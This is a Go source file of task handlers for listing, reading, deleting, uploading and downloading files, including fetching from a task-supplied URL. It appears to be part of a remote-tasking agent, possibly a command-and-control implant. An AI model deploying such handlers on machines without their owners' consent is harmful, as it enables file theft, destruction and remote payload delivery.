//go:build linux || windows
// +build linux windows

package main

import (
	"encoding/base64"
	"path/filepath"
	"strings"
)

func handleLS(task Task, res *TaskResult) {
	path := task.Path
	if path == "" {
		path = task.Command
	}
	out, err := listDirectory(path)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
		res.Path = path
	}
}

func handleDelete(task Task, res *TaskResult) {
	path := task.Path
	if path == "" {
		path = task.Command
	}
	err := deleteFileOrDir(path)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "Deleted: " + path
		res.Path = path
	}
}

func handleRead(task Task, res *TaskResult) {
	path := task.Path
	if path == "" {
		path = task.Command
	}
	data, err := readFileContent(path)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString(data)
		res.Encoding = "base64"
		res.Path = path
		res.Size = int64(len(data))
	}
}

func handleDownload(task Task, res *TaskResult) {
	if strings.HasPrefix(strings.ToLower(task.Command), "http") {
		dest := task.Shell
		if dest == "" {
			dest = task.Path
		}
		if dest == "" {
			dest = task.Command[strings.LastIndex(task.Command, "/")+1:]
		}
		if err := downloadFromURL(task.Command, dest); err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "Downloaded to: " + dest
			res.Path = dest
		}
	} else {
		path := task.Path
		if path == "" {
			path = task.Command
		}
		offset := task.Offset
		size := task.Size
		if size == 0 {
			size = 1024 * 1024
		}
		data, err := downloadFileChunk(path, offset, size)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString(data)
			res.Encoding = "base64"
			res.Path = path
			res.Offset = offset
			res.Size = int64(len(data))
			res.Filename = filepath.Base(path)
		}
	}
}

func handleUpload(task Task, res *TaskResult) {
	path := task.Path
	if path == "" {
		path = task.Command
	}
	offset := task.Offset
	if task.Data != "" || task.Shell != "" {
		b64 := task.Data
		if b64 == "" {
			b64 = task.Shell
		}
		err := uploadFileChunk(path, offset, b64)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "File chunk uploaded successfully"
			res.Path = path
			res.Offset = offset
		}
	} else {
		size := task.Size
		if size == 0 {
			size = 1024 * 1024
		}
		data, err := downloadFileChunk(path, offset, size)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString(data)
			res.Encoding = "base64"
			res.Path = path
			res.Offset = offset
			res.Size = int64(len(data))
			res.Filename = filepath.Base(path)
		}
	}
}
